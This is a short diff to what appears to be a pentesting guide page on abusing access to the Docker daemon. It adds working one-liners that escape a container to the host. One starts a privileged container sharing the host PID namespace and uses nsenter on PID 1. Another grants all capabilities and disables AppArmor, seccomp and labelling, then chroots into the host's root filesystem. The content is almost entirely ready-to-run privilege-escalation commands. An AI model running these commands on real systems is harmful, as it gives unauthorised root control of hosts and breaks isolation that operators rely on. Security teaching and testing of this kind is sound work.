@@ -42,6 +42,13 @@ In this case you can use regular docker commands to communicate with the docker 
 docker images
 #Run the image mounting the host disk and chroot on it
 docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
+
+# Get full access to the host via ns pid and nsenter cli
+docker run -it --rm --pid=host --privileged ubuntu bash
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+
+# Get full privs in container without --privileged
+docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 
 {% hint style="info" %}
